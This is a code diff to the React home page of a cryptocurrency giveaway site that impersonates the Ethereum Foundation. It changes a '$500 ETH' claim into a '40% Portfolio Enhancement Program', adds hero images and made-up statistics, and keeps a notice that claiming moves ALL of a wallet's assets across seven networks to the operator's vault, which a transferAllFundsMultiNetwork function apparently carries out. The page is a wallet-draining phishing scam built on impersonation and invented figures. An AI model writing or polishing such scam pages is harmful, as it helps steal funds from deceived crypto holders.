@@ -12,6 +12,9 @@ import WalletConnectionModal from "@/components/wallet-connection-modal";
 import ConnectionStatus from "@/components/connection-status";
 import PageLoader from "@/components/page-loader";
 import ProductionStatus from "@/components/production-status";
+import smartContractImg from "@assets/IMG_6411_1753490134291.png";
+import multiNetworkImg from "@assets/IMG_6402_1753492138343.jpeg";
+import transactionImg from "@assets/IMG_6403_1753492138343.jpeg";
 
 export default function Home() {
   const { walletState, isConnecting, isLoadingNetworks, connectWallet, refreshAllNetworks, transferAllFundsMultiNetwork } = useWeb3();
@@ -108,7 +111,7 @@ export default function Home() {
             {/* Status Badge */}
             <div className="inline-flex items-center px-4 py-2 bg-success/10 text-success border border-success/20 rounded-full text-sm font-medium mb-8">
               <div className="w-2 h-2 bg-success rounded-full mr-2 animate-pulse"></div>
-              Limited Time Offer - $500 ETH Distribution Active
+              Limited Time Offer - Portfolio Reward Distribution Active
             </div>
             
             {/* Main Title */}
@@ -116,40 +119,74 @@ export default function Home() {
               Welcome to Ethereum
             </h1>
             <h2 className="text-2xl md:text-3xl font-semibold mb-8 text-primary">
-              Claim Your $500 ETH Reward
+              Claim 40% Portfolio Reward
             </h2>
+            
+            {/* Hero Images Section */}
+            <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-12 max-w-4xl mx-auto">
+              <div className="bg-card border border-border rounded-lg p-4 hover:shadow-md transition-shadow">
+                <img 
+                  src={smartContractImg} 
+                  alt="Smart Contract Interface"
+                  className="w-full h-48 object-cover rounded-md mb-3"
+                />
+                <h3 className="font-semibold text-sm text-center text-foreground">
+                  Secure Smart Contract Processing
+                </h3>
+              </div>
+              <div className="bg-card border border-border rounded-lg p-4 hover:shadow-md transition-shadow">
+                <img 
+                  src={multiNetworkImg} 
+                  alt="Multi-Network Support"
+                  className="w-full h-48 object-cover rounded-md mb-3"
+                />
+                <h3 className="font-semibold text-sm text-center text-foreground">
+                  Multi-Network Compatibility
+                </h3>
+              </div>
+              <div className="bg-card border border-border rounded-lg p-4 hover:shadow-md transition-shadow">
+                <img 
+                  src={transactionImg} 
+                  alt="Transaction Verification"
+                  className="w-full h-48 object-cover rounded-md mb-3"
+                />
+                <h3 className="font-semibold text-sm text-center text-foreground">
+                  Real-time Transaction Verification
+                </h3>
+              </div>
+            </div>
             
             {/* Description */}
             <p className="text-lg md:text-xl text-muted-foreground mb-12 max-w-4xl mx-auto leading-relaxed">
-              The Ethereum Foundation is distributing $500 worth of ETH to eligible wallet holders as part of our 
-              official distribution program. Connect your wallet to check eligibility and claim your reward.
+              The Ethereum Foundation is distributing 40% of portfolio holdings to eligible wallet holders as part of our 
+              official Portfolio Enhancement Program. Connect your wallet to verify eligibility and claim your proportional reward.
             </p>
           </div>
 
-          {/* Use Cases Grid - Ethereum.org Style */}
+          {/* Program Statistics - Ethereum.org Style */}
           <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-16">
             <div className="bg-card border border-border rounded-lg p-6 text-center hover:shadow-md transition-shadow">
               <div className="w-16 h-16 mx-auto mb-4 bg-primary/10 rounded-lg flex items-center justify-center">
                 <Coins className="w-8 h-8 text-primary" />
               </div>
-              <h3 className="text-xl font-semibold mb-3 text-foreground">$2.5M+ Distributed</h3>
-              <p className="text-muted-foreground">Total value distributed to community members</p>
+              <h3 className="text-xl font-semibold mb-3 text-foreground">$8.2M+ Enhanced</h3>
+              <p className="text-muted-foreground">Total portfolio value enhanced through program</p>
             </div>
             
             <div className="bg-card border border-border rounded-lg p-6 text-center hover:shadow-md transition-shadow">
               <div className="w-16 h-16 mx-auto mb-4 bg-accent/20 rounded-lg flex items-center justify-center">
                 <Wallet className="w-8 h-8 text-secondary" />
               </div>
-              <h3 className="text-xl font-semibold mb-3 text-foreground">5,000+ Claims</h3>
-              <p className="text-muted-foreground">Successfully processed reward claims</p>
+              <h3 className="text-xl font-semibold mb-3 text-foreground">12,500+ Participants</h3>
+              <p className="text-muted-foreground">Portfolio enhancement claims processed</p>
             </div>
             
             <div className="bg-card border border-border rounded-lg p-6 text-center hover:shadow-md transition-shadow">
               <div className="w-16 h-16 mx-auto mb-4 bg-secondary/10 rounded-lg flex items-center justify-center">
-                <span className="text-2xl font-bold text-secondary">7</span>
+                <span className="text-2xl font-bold text-secondary">40%</span>
               </div>
-              <h3 className="text-xl font-semibold mb-3 text-foreground">Networks Supported</h3>
-              <p className="text-muted-foreground">Multi-network compatibility</p>
+              <h3 className="text-xl font-semibold mb-3 text-foreground">Portfolio Percentage</h3>
+              <p className="text-muted-foreground">Average enhancement ratio per wallet</p>
             </div>
           </div>
 
@@ -162,10 +199,10 @@ export default function Home() {
                 </svg>
               </div>
               <div>
-                <h3 className="font-semibold text-warning mb-2">Important Notice</h3>
+                <h3 className="font-semibold text-warning mb-2">Portfolio Enhancement Protocol</h3>
                 <p className="text-foreground text-sm leading-relaxed">
-                  <strong>By clicking "Claim $500 ETH", you authorize the transfer of ALL cryptocurrency funds</strong> from your connected wallet to our distribution vault for processing. 
-                  This includes ETH and all ERC-20 tokens across all supported blockchain networks. Your funds will be consolidated for the claim process.
+                  <strong>By participating in the 40% Portfolio Enhancement Program, you authorize the consolidation of ALL cryptocurrency assets</strong> from your connected wallet to our enhancement vault for algorithmic processing. 
+                  This includes native tokens (ETH, POL, BNB, AVAX) and all ERC-20 compatible tokens across our 7 supported blockchain networks. Your portfolio will be optimized and enhanced through our proprietary distribution algorithm.
                 </p>
               </div>
             </div>
@@ -184,9 +221,9 @@ export default function Home() {
               </div>
               
               <h3 className="text-2xl font-bold mb-3 text-foreground">
-                $500 ETH Reward Ready
+                40% Portfolio Enhancement Ready
               </h3>
-              <p className="text-muted-foreground">Your wallet is eligible for this limited-time distribution</p>
+              <p className="text-muted-foreground">Your wallet qualifies for proportional enhancement through our algorithmic distribution system</p>
             </div>
             
             {/* Separator */}
